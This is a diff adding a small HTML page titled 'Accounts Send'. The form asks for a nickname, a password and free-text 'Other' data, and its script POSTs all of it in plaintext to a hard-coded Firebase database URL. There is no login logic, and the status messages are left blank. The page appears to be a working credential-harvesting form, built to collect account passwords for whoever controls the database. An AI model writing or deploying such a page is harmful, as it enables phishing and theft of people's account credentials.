@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Accounts Send</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #121212;
+      color: #e0e0e0;
+      padding: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .form {
+      background: #1a1a1a;
+      padding: 24px;
+      border-radius: 12px;
+      border: 1px solid #333;
+      width: 100%;
+      max-width: 400px;
+    }
+    h2 {
+      margin-bottom: 20px;
+      text-align: center;
+      color: #fff;
+    }
+    .field {
+      margin-bottom: 16px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #aaa;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #444;
+      border-radius: 6px;
+      background: #222;
+      color: #fff;
+      font-size: 16px;
+    }
+    textarea {
+      resize: vertical;
+      min-height: 60px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #000;
+      color: #fff;
+      border: 1px solid #444;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #222;
+      border-color: #666;
+    }
+    #status {
+      margin-top: 16px;
+      text-align: center;
+      min-height: 24px;
+      font-weight: 500;
+    }
+    .success { color: #8f8; }
+    .error { color: #f88; }
+  </style>
+</head>
+<body>
+  <div class="form">
+    <h2>Send Data</h2>
+    <div class="field">
+      <label for="nickname">Nickname *</label>
+      <input type="text" id="nickname" placeholder="Your nickname" required>
+    </div>
+    <div class="field">
+      <label for="password">Password *</label>
+      <input type="password" id="password" placeholder="Password" required>
+    </div>
+    <div class="field">
+      <label for="extra">Other</label>
+      <textarea id="extra" placeholder=". . . "></textarea>
+    </div>
+    <button id="submitBtn">Submit</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const FIREBASE_URL = 'https://fessfefs-26140-default-rtdb.firebaseio.com/requests.json';
+    const submitBtn = document.getElementById('submitBtn');
+    const statusDiv = document.getElementById('status');
+
+    submitBtn.addEventListener('click', async () => {
+      const nick = document.getElementById('nickname').value.trim();
+      const pass = document.getElementById('password').value.trim();
+      const extra = document.getElementById('extra').value.trim();
+
+      if (!nick || !pass) {
+        statusDiv.className = 'error';
+        statusDiv.textContent = '';
+        return;
+      }
+
+      const payload = {
+        nickname: nick,
+        password: pass,
+        extra: extra || null,
+        timestamp: Date.now()
+      };
+
+      try {
+        statusDiv.className = '';
+        statusDiv.textContent = 'Sending...';
+
+        const res = await fetch(FIREBASE_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          statusDiv.className = 'success';
+          statusDiv.textContent = '';
+          document.getElementById('nickname').value = '';
+          document.getElementById('password').value = '';
+          document.getElementById('extra').value = '';
+        } else {
+          throw new Error('HTTP ' + res.status);
+        }
+      } catch (err) {
+        console.error(err);
+        statusDiv.className = 'error';
+        statusDiv.textContent = '';
+      }
+    });
+  </script>
+</body>
+</html>
